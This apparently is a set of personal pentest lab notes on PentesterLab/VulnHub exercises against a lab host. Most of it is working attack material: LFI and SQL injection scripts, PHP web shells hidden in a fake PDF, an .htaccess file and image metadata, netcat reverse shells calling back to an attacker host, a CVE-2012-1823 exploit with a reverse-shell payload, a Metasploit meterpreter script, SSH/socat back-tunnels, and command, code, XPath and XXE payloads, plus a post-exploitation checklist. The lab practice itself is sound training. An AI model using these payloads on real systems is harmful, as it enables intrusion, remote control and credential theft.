


https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/


This exercice describes the exploitation of a local file include with limited access. Once code execution is gained, you will see some post exploitation tricks.



 
$ curl -s http://192.168.110.55/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00 | sed '/<div class="content">/,/<\/div>/!d' | sed 's/<\/\?[^>]\+>//g'| xargs | base64 -d


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash



$ curl -s http://192.168.110.55/index.php?page=php://filter/convert.base64-encode/resource=classes/submission | sed '/<div class="content">/,/<\/div>/!d' | sed 's/<\/\?[^>]\+>//g'| xargs | base64 -d




```php

  function create(){
    if(isset($_FILES['pdf'])){
      $dir = 'uploads/';
      $file = $_FILES['pdf']['name'];
      if ((mime_content_type($_FILES['pdf']['tmp_name']) != "application/pdf")){ 
        DIE("File must be a PDF!!");
      }
      if (!preg_match('/\.pdf$/',$file)) {
        DIE("File must be a PDF!!");
      }
      else  { 
        if(!move_uploaded_file($_FILES['pdf']['tmp_name'], $dir . $file)) {
          die("Error during upload");
        }
      } 
      $sql = "INSERT INTO submissions (email,password,";
      $sql .= "title,description,bio, filename) VALUES ('";

      $title = mysql_real_escape_string($_POST["title"]);
      $file = $dir.mysql_real_escape_string( $file);
      $email = mysql_real_escape_string( $_POST["email"]);
      $password = mysql_real_escape_string( $_POST["password"]);
      $bio = mysql_real_escape_string( $_POST["bio"]);
      $description = mysql_real_escape_string( $_POST["description"]);

    
      $sql .= $email."','".$password."','".$title."','".$description."','";
      $sql .= $bio."','".$file;
      $sql.= "')";
      $result = mysql_query($sql);
      echo mysql_error(); 
    }

  }

```




```python
# submit form
# <form action="/index.php" method="POST" enctype="multipart/form-data">
# Email:<br>  <input type="text" name="email" size="72"><br>
# Password:<br> <input type="password" name="password" size="72"><br>
# Password (again):<br> <input type="password" name="password_again" size="72"><br>
# <br>

# Title:<br>  <input type="text" name="title" size="72"><br>
# Description:<br>
# <textarea name="description" cols="62" rows="6">  </textarea>
# Bio:<br>
# <textarea name="bio" cols="62" rows="6">  </textarea>

# PDF of your presentation:<br>
# <input type="file" name="pdf" size="61"><br> 
# <div align="center">
# <input type="reset" value="Cancel">
# <input type="submit" name="submit" value="Submit">
# </div>
# </form>

import requests
import string

session = requests.Session()
url = "http://192.168.110.55/index.php"

response = session.get(url)
cookies = session.cookies.get_dict()


data = {
    "email" : "test@pentest.com",
    "password" : "test123456",
    "password_again" : "test123456",
    "title" : "test",
    "description" : "test",
    "bio" : "test",
    "submit" : "Submit",
}


# files = {'pdf': open('test.pdf','rb')}
files = {'pdf': open('shell.pdf','rb')}

r = session.post(url, files=files, data=data, cookies=cookies)

print (r.text)

```


Fake PDF file

```bash

$ cat shell.pdf 
%PDF-1.5
<?php system(_GET["cmd"]); ?>

```


Exploit 

```bash
curl -s -G  'http://192.168.110.55/index.php?page=uploads/shell.pdf%00&cmd=ls%20-al' | sed '/<div class="content">/,/<\/div>/!d' | sed -r -e '1,2d' -e '$d' -e 's/^\s+//'

curl -s -G  'http://192.168.110.55/index.php?page=uploads/shell.pdf%00&cmd=nc%20192.168.110.1%204444%20-e%20/bin/sh'

```

Socat tunning


```bash
# attacker
sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr

# victim
while true; do socat TCP4:192.168.110.1:443 TCP4:127.0.0.1:22 2>&1 ; done

# attacker 
# ssh-genkey -P "" -f vulnerable
ssh www-data@localhost -p 2222  -i vulnerable

```


SSH tunning

```bash

# ssh-genkey -P "" -f kali
# append kali.pub to the ~/.ssh/authorized_keys
ssh -N -f -R 2222:127.0.0.1:22  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i kali 2>&1

```





# PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection 

https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/

https://pentesterlab.com/exercises/cve-2012-1823/course

```python

#https://www.exploit-db.com/exploits/18836
import socket
import sys

def cgi_exploit():
        pwn_code = """<?php phpinfo();?>""" 
        pwn_code = """<?php system('nc 192.168.110.1 4444 -e /bin/sh');?>""" 
        post_Length = len(pwn_code)
        http_raw="""POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s
""" %(HOST , post_Length ,pwn_code)
        print http_raw
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, int(PORT)))
            sock.send(http_raw)
            data = sock.recv(10000)
            print repr(data)
            sock.close()
        except socket.error, msg:
            sys.stderr.write("[ERROR] %s\n" % msg[1])
            sys.exit(1)
               
if __name__ == '__main__':
        try:
            HOST = sys.argv[1]
            PORT = sys.argv[2]
            cgi_exploit()
        except IndexError:
            print '[+]Usage: cgi_test.py site.com 80'
            sys.exit(-1)

```



  └─$ cat cgi-injection.msf
  use exploit/multi/http/php_cgi_arg_injection
  set RHOST 192.168.110.55
  set RPORT 80
  set PAYLOAD php/meterpreter/reverse_tcp
  set LHOST 192.168.110.1
  exploit
  └─$ msfconsole -r cgi-injection.msf

# From SQL Injection to Shell

https://pentesterlab.com/exercises/from_sqli_to_shell/course




```python

import requests
import string
import sys

session = requests.Session()

url = "http://192.168.110.55/cat.php"

payload = {'id': '1'}
payload = {'id': "1 union select null, null, null, null"}
payload = {'id': "1 union select 'a', 'b', 'c', 'd'"}
payload = {'id': "1 union select 'a', @@version, 'c', 'd'"}

for line in sys.stdin:
    line = line.rstrip()
    if 'exit' == line.rstrip():
        break

    p = "1 union {i}"    
    payload['id'] = p.format(i=line)
    r = requests.get(url, params=payload)
    print (r.text)
    print(p.format(i=line))
print("Done")

#admin / P4ssw0rd



```


SELECT null, database(), database(), null

SELECT null, table_name, table_name, null FROM INFORMATION_SCHEMA.TABLES
SELECT null,column_name,column_name, null FROM  INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'photoblog' and TABLE_NAME= 'users'
SELECT null, TABLE_NAME, TABLE_NAME, null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG = 'photoblog'
SELECT null, login, password, null FROM users

admin / 8efe310f9ab3efeae8d410a8e0166eb2

./john password --format=raw-md5  --wordlist=dico --rules

admin / P4ssw0rd


## File Upload

https://book.hacktricks.xyz/pentesting-web/file-upload

Use extensions : .php.text, .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc

```bash
# cat .htaccess
# <!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### <?php echo "-->"; system($_GET['c']); ?>

```



# From SQL injection to Shell II


https://unknownyetblogspot.wordpress.com/2019/07/01/pentester-lab-from-sql-injection-to-shell-ll/

Details

This exercise explains how you can, from a blind SQL injection, gain access to the administration console. Then in the administration console, how you can run commands on the system.
What you will learn?

Blind SQL injection exploitation using time-based exploitation Gaining code execution using a PHP webshell


  $ dirb http://192.168.110.55/

  -----------------
  DIRB v2.22    
  By The Dark Raver
  -----------------

  START_TIME: Fri Oct  8 21:55:26 2021
  URL_BASE: http://192.168.110.55/
  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

  -----------------

  GENERATED WORDS: 4612                                                          

  ---- Scanning URL: http://192.168.110.55/ ----
  ==> DIRECTORY: http://192.168.110.55/admin/
  ==> DIRECTORY: http://192.168.110.55/classes/
  ==> DIRECTORY: http://192.168.110.55/css/
  + http://192.168.110.55/favicon.ico (CODE:200|SIZE:14634) 
  ==> DIRECTORY: http://192.168.110.55/images/
  + http://192.168.110.55/index.php (CODE:200|SIZE:1367)
  ---- Entering directory: http://192.168.110.55/admin/ ----
  + http://192.168.110.55/admin/index.php (CODE:302|SIZE:0)
  ==> DIRECTORY: http://192.168.110.55/admin/uploads/
  ---- Entering directory: http://192.168.110.55/classes/ ----
  ---- Entering directory: http://192.168.110.55/css/ ----
  ---- Entering directory: http://192.168.110.55/images/ ----
  ---- Entering directory: http://192.168.110.55/admin/uploads/ ----






Scrip detect SQL Injection to HTTP Headers


X_FORWARDED_FOR :127.0.0.1' or 1=1#
User-Agent: aaa' or 1/*
Referer: http://www.yaboukir.com
Cookie
User-Agent
Referer


sqlmap -u "http://192.168.110.55/" --headers="X-Forwarded-For: *" --dbs --batch


script python and use the file cat  /usr/share/wordlists/wfuzz/Injections/SQL.txt 



```console
# Test

select * from users where username=concat('admin',(select if ('1'='1', 'istrator', 'bbt')));
curl "http://192.168.110.55/index.php" -H "x-forwarded-for: test' union select sleep(10) #"
curl "http://192.168.110.55/index.php" -H "x-forwarded-for: test' union select sleep(3),sleep(3) from users #"

curl "http://192.168.110.55/index.php" -H "x-forwarded-for: test' union select login,sleep(3) from users #"
curl "http://192.168.110.55/index.php" -H "x-forwarded-for: test' union select sleep(5), password from users #"

curl "http://192.168.110.55/index.php" -H "x-forwarded-for: test' union select sleep(5), password from users where login= 'admin' #"
curl "http://192.168.110.55/index.php" -H "x-forwarded-for: test' union select sleep(5), password from users where login= 'admin' and substring('admin',1,1)='a' #"


```



```python

import requests
import string
import sys
import time


# curl "http://192.168.110.55/index.php" -H "x-forwarded-for: test' union select sleep(5), password from users where login= 'admin' #"
url = "http://192.168.110.55/index.php"

headers = {
    "x-forwarded-for": "test' union select sleep(3), password from users where login= 'admin' and substring(password, 1, {n}) = '{p}' #"
}


def w(t):
    sys.stdout.write(t)
    sys.stdout.flush()


password = ""
drap = True
cnt = 1

w("\nMot de passe : ")


# print ((headers['x-forwarded-for']).format(n=1, p = "qsdf"))

while drap:
    payload = "test' union select sleep(5), password from users where login= 'admin' and substring(password, 1, {n}) = '{p}' #"
    for x in string.printable:
        drap = False
        headers["x-forwarded-for"] = payload.format(n=cnt, p=password+x)
        # print (headers["x-forwarded-for"])
        start = time.time()
        r = requests.get(url, headers=headers)
        t = time.time() - start
        if (t > 3.0):
            password = password+x
            w(x)
            if cnt == len(password.strip()):
                cnt += 1
                drap = True
            break

```


```bash


sqlmap -u "http://192.168.110.55/" --headers="X-Forwarded-For: *" --dbms=MySQL --dbs --batch
sqlmap -u "http://192.168.110.55/" --headers="X-Forwarded-For: *" --dbms=MySQL -D photoblog -T users -C login,password  --batch --dump

```

## Admin password

```bash
# cat password P4ssw0rd
8efe310f9ab3efeae8d410a8e0166eb2

john passwd --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt


```



## Exploit

```bash
# test
└─$ curl -I  http://192.168.110.55/admin/uploads/1633964292.jpg                                 23 ⨯
HTTP/1.1 200 OK
Server: nginx/0.7.67
Date: Mon, 11 Oct 2021 17:35:44 GMT
Content-Type: image/jpeg
Content-Length: 36227
Last-Modified: Mon, 11 Oct 2021 14:58:12 GMT
Connection: keep-alive
Accept-Ranges: bytes

curl -I  http://192.168.110.55/admin/uploads/1633964292.jpg/blah.php
HTTP/1.1 200 OK
Server: nginx/0.7.67
Date: Mon, 11 Oct 2021 17:36:10 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.3-7+squeeze15



# Exploit
#cat shell.php          
<?php system($_GET['c']); ?>
exiftool "-comment<=shell.php" shell.jpg

curl -G --data-urlencode "c=nc 192.168.110.1 4444 -e /bin/sh"  http://192.168.110.55/admin/uploads/1633964292.jpg/blah.php 

```



# Postgresql

http://192.168.110.55/cat.php?id=1%20or%20cat=2

http://192.168.110.55/cat.php?id=1%20order%20by%204
curl http://192.168.110.55/cat.php?id=1%20union%20select%20null,%20login,%20password,null%20from%20users

<div class="content">
  <h2 class="title">Picture: admin</h2>
  <div class="inner" align="center">
    <p>
      <img src="admin/uploads/8efe310f9ab3efeae8d410a8e0166eb2" alt="admin" />          </p>
  </div>
</div>



## Exploit

```bash

curl http://192.168.110.55/admin/uploads/.htaccess?c=nc%20192.168.110.1%204444%20-e%20/bin/bash

nc -lvp 4444

```



# 

```bash

# mot de passe live
ssh user@vulnerable 

sudo -l

```
## notes

To start
  cd /tmp
  screen
  Ctrl-a and then H

To stop
  Ctrl-a and then H

## read file

  cat file | grep password
  vi -R file
  nano -v file

## Version
  
  Debian : /etc/debian_version
  Redhat : /etc/redhat-release
  Fedora : /etc/fedora-release
  Ubuntu : lsb_release -a

## Kernel

  uname -a
  uptime

## Time management

  cat /etc/timezone
  ps -edf | grep ntp
  ntpq -p -n

## Packages installed

  dpkg -l

## Logging

  ps -edf | grep syslog
  cat /etc/rsyslog.conf

## Network review

  ifconfig -a
  route -n
  netstat -rn
  cat /etc/resolv.conf
  cat /etc/hosts

## Firewall

  iptables -L -v

  # cat etc/network/if-pre-up.d/iptables                                     
  #!/bin/bash

  /sbin/iptables-restore < /etc/iptables.up.rules

  # cat /etc/iptables.up.rules                  
  *filter
  :INPUT DROP [0:0]
  :FORWARD ACCEPT [0:0]
  :OUTPUT ACCEPT [27:3016]
  -A INPUT -i lo -j ACCEPT 
  -A INPUT -i eth0 -p tcp -m tcp --dport 22 -j ACCEPT 
  -A INPUT -i eth0 -p tcp -m tcp --dport 80 -j ACCEPT 
  -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
  COMMIT

  ip6tables -L -v


## Mounted partitions

  /etc/fstab
  NB : noexec, nosuid


## Sensitive files

  /etc/shadow
  /etc/mysql/my.cnf
  ssh keys

## SUID


  find / -perm -4000 -ls  2> /dev/null

## Normal files readable and write-able by any users

  find / -type f -perm -006  2>/dev/null | grep -v /proc


## Files write-able by any users

  find / -type f -perm -002  2>/dev/null | grep -v /proc

## Backup
  
  /backup

## /etc/passwd
  
  /bin/bash
  /bin/sh

## /etc/shadow

  does not have a $ sign, DES is used;
  starts by $1$, MD5 is used;
  starts by $2$ or $2a$, Blowfish is used;
  starts by $5$, SHA-256 is used;
  starts by $6$, SHA-512 is used.

  cat /etc/pam.d/common-password

## Crack linux password

  ./john password --format=crypt  --wordlist=dico --rules

## /etc/sudoers


  egrep -v '^#|^$'  /etc/sudoers

## Service

  ps -edf

  lsof -i UDP -n -P
  lsof -i TCP -n -P

## /etc/ssh/sshd_config
  
  PermitRootLogin no
  protocol 2
  AllowTcpForwarding no

## /etc/mysql/my.cnf

## /var/lib/mysql/mysql/user.MYD


## /etc/apache2/apache2.conf /etc/apache2/envvars

  # cat /etc/apache2/mods-enabled/php5.conf PentesterLab Learn Web App Pentesting!
  <IfModule mod_php5.c>
     <FilesMatch "\.ph(p3?|tml)$">
       SetHandler application/x-httpd-php
     </FilesMatch>
     <FilesMatch "\.phps$">
       SetHandler application/x-httpd-php-source
     </FilesMatch>
     # To re-enable php in user directories comment the following lines
     # (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
     # prevents .htaccess files from disabling it.
     <IfModule mod_userdir.c>
         <Directory /home/*/public_html>
             php_admin_value engine Off
         </Directory>
     </IfModule>
  </IfModule>

## PHP configuration

  /etc/php5/apache2/php.ini

  expose_php off
  display_errors Off
  error_reporting E_ALL
  log_errors On
  safe_mode On
  disable_functions eval, exec, passthru, shell_exec, system,..
  allow_url_include Off


  egrep -v -e '^;|^$' /etc/php5/apache2/conf.d/suhosin.ini

## Crontab
    
    crontab -u <user> -l





# Web 1


https://pentesterlab.com/exercises/web_for_pentester/course


```text
└─$ sqlmap --list-tamper
* 0eunion.py - Replaces instances of <int> UNION with <int>e0UNION
* apostrophemask.py - Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)
* apostrophenullencode.py - Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)
* appendnullbyte.py - Appends (Access) NULL byte character (%00) at the end of payload
* base64encode.py - Base64-encodes all characters in a given payload
* between.py - Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
* binary.py - Injects keyword binary where possible
* bluecoat.py - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE
* chardoubleencode.py - Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)
* charencode.py - URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)
* charunicodeencode.py - Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
* charunicodeescape.py - Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)
* commalesslimit.py - Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart
* commalessmid.py - Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart
* commentbeforeparentheses.py - Prepends (inline) comment before parentheses (e.g. ( -> /**/()
* concat2concatws.py - Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart
* dunion.py - Replaces instances of <int> UNION with <int>DUNION
* equaltolike.py - Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart
* equaltorlike.py - Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart
* escapequotes.py - Slash escape single and double quotes (e.g. ' -> \')
* greatest.py - Replaces greater than operator ('>') with 'GREATEST' counterpart
* halfversionedmorekeywords.py - Adds (MySQL) versioned comment before each keyword
* hex2char.py - Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart
* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)
* ifnull2casewhenisnull.py - Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart
* ifnull2ifisnull.py - Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart
* informationschemacomment.py - Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier
* least.py - Replaces greater than operator ('>') with 'LEAST' counterpart
* lowercase.py - Replaces each keyword character with lower case value (e.g. SELECT -> select)
* luanginx.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare)
* misunion.py - Replaces instances of UNION with -.1UNION
* modsecurityversioned.py - Embraces complete query with (MySQL) versioned comment
* modsecurityzeroversioned.py - Embraces complete query with (MySQL) zero-versioned comment
* multiplespaces.py - Adds multiple spaces (' ') around SQL keywords
* overlongutf8.py - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)
* overlongutf8more.py - Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
* percentage.py - Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)
* plus2concat.py - Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart
* plus2fnconcat.py - Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
* randomcase.py - Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
* randomcomments.py - Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
* schemasplit.py - Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')
* sleep2getlock.py - Replaces instances like 'SLEEP(5)' with (e.g.) "GET_LOCK('ETgP',5)"
* sp_password.py - Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
* space2comment.py - Replaces space character (' ') with comments '/**/'
* space2dash.py - Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
* space2hash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
* space2morecomment.py - Replaces (MySQL) instances of space character (' ') with comments '/**_**/'
* space2morehash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
* space2mssqlblank.py - Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
* space2mssqlhash.py - Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
* space2mysqlblank.py - Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
* space2mysqldash.py - Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
* space2plus.py - Replaces space character (' ') with plus ('+')
* space2randomblank.py - Replaces space character (' ') with a random blank character from a valid set of alternate characters
* substring2leftright.py - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
* symboliclogical.py - Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
* unionalltounion.py - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
* unmagicquotes.py - Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
* uppercase.py - Replaces each keyword character with upper case value (e.g. select -> SELECT)
* varnish.py - Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall
* versionedkeywords.py - Encloses each non-function keyword with (MySQL) versioned comment
* versionedmorekeywords.py - Encloses each keyword with (MySQL) versioned comment
* xforwardedfor.py - Append a fake HTTP header 'X-Forwarded-For' (and alike)
```





  example1 : -- - http://vulnerable/sqli/example1.php?name=root%27%20or%20%27t%27=%27t%27%20%23

  curl -s -G --data-urlencode "name=root' or 't'='t" http://vulnerable/sqli/example1.php  | sed '/<table class=\x27table table-striped\x27>/,/<\/table>/!d' | sed -e 's/<\/tr>/\n/g'| sed -e 's/<\/td>/\t/g'| sed -e 's/<\/th>/\t/g'| sed -e 's/<[^>]*>//g'| sed 's/^[ \t]*//;s/[ \t]*$//'

  sqlmap -u "http://vulnerable/sqli/example1.php?name=root" -p "name" --dbms=MySQL --dbs --batch

  http://vulnerable/sqli/example2.php?name=root%27%09or%09%27t%27=%27t
  http://vulnerable/sqli/example2.php?name=root%27/**/or/**/%27t%27=%27t

http://vulnerable/sqli/example4.php?id=2%20or%201%20=%201
http://vulnerable/sqli/example5.php?id=2%20or%201%20=%201
  sqlmap -u "http://vulnerable/sqli/example5.php?id=2" -p "id" --dbms=MySQL --dbs --batch
  sqlmap -u "http://vulnerable/sqli/example7.php?id=2" -p "id" --dbms=MySQL --dbs --batch


## Directory traversal

$ curl http://vulnerable/dirtrav/example1.php?file=../../../etc/passwd
$ curl http://vulnerable/dirtrav/example1.php?file=../../../var/www/dirtrav/example1.php
curl http://vulnerable/dirtrav/example2.php?file=/var/www/files/../dirtrav/example2.php
curl http://vulnerable/dirtrav/example2.php?file=/var/www/files/../../../etc/passwd
curl http://vulnerable/dirtrav/example3.php?file=../../../etc/passwd%00
curl http://vulnerable/dirtrav/example3.php?file=../../../var/www/dirtrav/example3.php%00


## File Include

```php

<?php
  if ($_GET["page"]) {
    include($_GET["page"]);
  } 
?>
```

curl http://vulnerable/fileincl/example1.php?page=/etc/passwd
curl http://vulnerable/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=example1.php

```php

<?php
  if ($_GET["page"]) {
    $file = $_GET["page"].".php";
    // simulate null byte issue
    $file = preg_replace('/\x00.*/',"",$file);
    include($file);
  } 
?>

```

curl http://vulnerable/fileincl/example2.php?page=/etc/passwd%00
curl http://vulnerable/fileincl/example2.php?page=php://filter/convert.base64-encode/resource=example2


## Code injection


https://www.blackhat.com/presentations/bh-usa-09/ESSER/BHUSA09-Esser-PostExploitationPHP-PAPER.pdf

https://www.fatalerrors.org/a/summarize-code-execution-and-command-execution.html


curl 'http://vulnerable/codeexec/example1.php?name=aa%22.system(%27cat%20example1.php%27);%22bb'

```php

<?php 
  $str="echo \"Hello ".$_GET['name']."!!!\";";
  eval($str);
?>

```
curl 'http://vulnerable/codeexec/example1.php?name=aa%22.system(%27cat%20/etc/passwd%27);%22bb'

  "."
  "./*pentesterlab*/"
  ".system('uname -a'); $dummy="
  ".system('uname -a');# or ".system('uname -a');//


```php

  $sql = "SELECT * FROM users ";
  $order = $_GET["order"];
  $result = mysql_query($sql);
  if ($result) {
    while ($row = mysql_fetch_assoc($result)) {
    $users[] = new User($row['id'],$row['name'],$row['age']);
  }
  if (isset($order)) { 
    usort($users, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
  }


```




curl "http://vulnerable/codeexec/example2.php?order=name);%7dsystem(%27cat%20example2.php%27);


curl "http://vulnerable/codeexec/example2.php?order=name);%7dsystem(%27cat%20example2.php%27);
?order=id);}system('uname%20-a');//
?order=id);}system('ls');//

```php

<?php
  echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
?>


```

http://vulnerable/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer
curl "http://vulnerable/codeexec/example3.php?new=system('id')&pattern=/lamer/e&base=Hello%20lamer"



```php
assert(trim("'".$_GET['name']."'"));
```

http://vulnerable/codeexec/example4.php?name=hacker%27.phpinfo().%27
http://vulnerable/codeexec/example4.php?name=hacker%27.system(%22ls%22).%27




## Commands injection

```php
system("ping -c 2 ".$_GET['ip']);

```

http://vulnerable/commandexec/example1.php?ip=127.0.0.1;ls
curl "http://vulnerable/commandexec/example1.php?ip=;cat%20example1.php"

```php

if (!(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m', $_GET['ip']))) {
  die("Invalid IP address");
}

```


curl http://vulnerable/commandexec/example2.php?ip=127.0.0.1%0Acat%20example2.php

curl 'http://vulnerable/commandexec/example3.php?ip=127.0.0.1;cat%20example3.php'

In PHP, an easy and simple way to redirect users if one of the values provided doesn't match some security constraint is to call the function header. However, even if the browser will get redirected, this function does not stop the execution flow, and the script will still finish to run with the dangerous parameter. The developer needs to call the function die after the call to the function header, to avoid this issue.

```php

  if (!(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/', $_GET['ip']))) {
     header("Location: example3.php?ip=127.0.0.1");
     // die();
  }
  system("ping -c 2 ".$_GET['ip']);


```


```bash

curl "http://vulnerable/ldap/example2.php?name=hacker)(cn=*))%00&password=hacker"
wfuzz -c -z file,ldap_fuzz.txt http://vulnerable/ldap/example1.php?username=FUZZ&password=password

```


## File Upload

http://vulnerable/upload/images/shell.phtml?c=ls%20-al
http://vulnerable/upload/images/shell.php.blahblah?c=ls%20-al


## XML

  & : %26
  <!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>&x;</test>

  curl 'http://vulnerable/xml/example1.php?xml=%3C!DOCTYPE%20test%20[%3C!ENTITY%20x%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E%3Ctest%3E%26x;%3C/test%3E' --globoff 


Example 2

    ' and '1'='1 and you should get the same result.
    ' or '1'='0 and you should get the same result.
    ' and '1'='0 and you should not get any result.
    ' or '1'='1 and you should get all results.


[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]

<<<<<<< HEAD
    hacker']%00
    hacker' or 1=1]%00 
    '%20or%201=1]/child::node()%00
    hacker'%20or%201=1]/parent::*/child::node()%00
    hacker']/parent::*/password%00
=======
  hacker']%00
  hacker' or 1=1]%00 
  '%20or%201=1]/child::node()%00
  hacker'%20or%201=1]/parent::*/child::node()%00
  hacker']/parent::*/password%00
>>>>>>> a624775d122d8110aa670d60df2e5a19315566e7

